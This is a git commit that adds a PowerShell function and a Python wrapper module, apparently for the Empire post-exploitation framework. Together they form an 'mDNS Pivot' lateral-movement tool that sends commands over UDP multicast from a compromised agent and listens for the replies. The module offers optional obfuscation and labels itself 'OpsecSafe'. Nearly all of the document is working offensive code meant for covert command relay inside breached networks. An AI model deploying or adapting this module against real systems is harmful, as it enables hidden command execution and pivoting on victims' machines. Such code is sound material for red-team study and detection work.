77ebc52db41df3c0d70e2e8507a21aaaba2860e7
rvrsh3ll <steveborosh@gmail.com>
2017-08-20 10:48:17 -0400

    Initial commit of mdns code

---
+++ data/module_source/management/Invoke-mDNSCommand.ps1
@@ -0,0 +1,72 @@
+function Send-mDNSCommand {
+    <#
+    .SYNOPSIS
+    Send a command via multicast
+    .DESCRIPTION
+    Send a command via multicast
+    .EXAMPLE
+    Send-mDNSCommand -Command "Get-Process"
+    .PARAMETER MultiCastGroup
+    The Multicast Group to listen on
+    .PARAMETER MultiCastPort
+    The port to listen for UDP packets
+    .PARAMETER BindPort
+    The port to bind to for sending UDP packets
+    .PARAMETER Command
+    The command to run
+    #>
+    [CmdletBinding()]
+    Param (
+        [Parameter(Mandatory = $false, Position = 0)]
+        [String]
+        $MultiCastGroup = "224.1.1.1",
+
+        [Parameter(Mandatory = $false, Position = 1)]
+        [String]
+        $MultiCastPort = 51111,
+
+        [Parameter(Mandatory = $false, Position = 1)]
+        [String]
+        $BindPort = 51112,
+        
+        [Parameter(Mandatory = $false, Position = 0)]
+        [String]
+        $Command = "Get-Process"
+    )
+    Begin {
+        $udp_client = new-Object System.Net.Sockets.UdpClient $BindPort
+        $multicast_group = [IPAddress]$MultiCastGroup
+        $udp_client.JoinMulticastGroup($multicast_group)
+        $enc = [system.Text.Encoding]::UTF8
+        $response_packet = $enc.GetBytes($Command) 
+        $endpoint = New-Object Net.IPEndpoint([IPAddress]$MultiCastGroup,$MultiCastPort)
+    }
+    Process {
+        Try {
+            $udp_client.Connect($endpoint)
+            $udp_client.Send($response_packet,$response_packet.Length) |Out-Null  
+            $udp_client.Close()
+            $udp_client = New-Object System.Net.Sockets.UdpClient
+            $udp_client.ExclusiveAddressUse = $False
+            $LocalEndPoint = New-Object System.Net.IPEndPoint([ipaddress]::Any,$MultiCastPort)
+            $udp_client.Client.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::ReuseAddress,$true)
+            $udp_client.ExclusiveAddressUse = $False
+            $udp_client.Client.Bind($LocalEndPoint)
+            $multicast_group = [IPAddress]::Parse($MultiCastGroup)
+            $udp_client.JoinMulticastGroup($multicast_group)
+            While ($true) {
+                $receivebytes = $udp_client.Receive([ref]$endpoint)
+                $receive_data = ([text.encoding]::ASCII).GetString($receivebytes)
+                Write-Host $receive_data
+                
+            } 
+        }                
+        Catch {
+            $ErrorMessage = $_.Exception.Message
+            $FailedItem = $_.Exception.ItemName
+        }
+    }
+    End {
+        $udp_client.Close()
+    }
+}
---
+++ lib/modules/powershell/lateral_movement/send_mdnscommand.py
@@ -0,0 +1,81 @@
+from lib.common import helpers
+
+class Module:
+
+    def __init__(self, mainMenu, params=[]):
+
+        self.info = {
+            'Name': 'mDNS Pivot',
+
+            'Author': ['@424f424f'],
+
+            'Description': ("Send command to mDNS client."),
+
+            'Background' : False,
+
+            'OutputExtension' : None,
+            
+            'NeedsAdmin' : False,
+
+            'OpsecSafe' : True,
+            
+            'Language' : 'powershell',
+
+            'MinLanguageVersion' : '2',
+            
+            'Comments': [ ]
+        }
+
+        # any options needed by the module, settable during runtime
+        self.options = {
+            # format:
+            #   value_name : {description, required, default_value}
+            'Agent' : {
+                'Description'   :   'Agent to run module on.',
+                'Required'      :   True,
+                'Value'         :   ''
+            },
+            'Command' : {
+                'Description'   :   'Command to run.',
+                'Required'      :   True,
+                'Value'         :   'ps'
+            }
+        }
+
+        # save off a copy of the mainMenu object to access external functionality
+        #   like listeners/agent handlers/etc.
+        self.mainMenu = mainMenu
+
+        for param in params:
+            # parameter format is [Name, Value]
+            option, value = param
+            if option in self.options:
+                self.options[option]['Value'] = value
+
+
+    def generate(self, obfuscate=False, obfuscationCommand=""):
+        command = self.options["Command"]['Value']
+        # read in the common module source code
+        moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-mDNSCommand.ps1"
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
+        try:
+            f = open(moduleSource, 'r')
+        except:
+            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            return ""
+
+        moduleCode = f.read()
+        f.close()
+
+        script = moduleCode
+        
+
+        scriptEnd = "\nSend-mDNSCommand -Command %s" % (command)
+
+        scriptEnd += " | Out-String "
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
+        return script
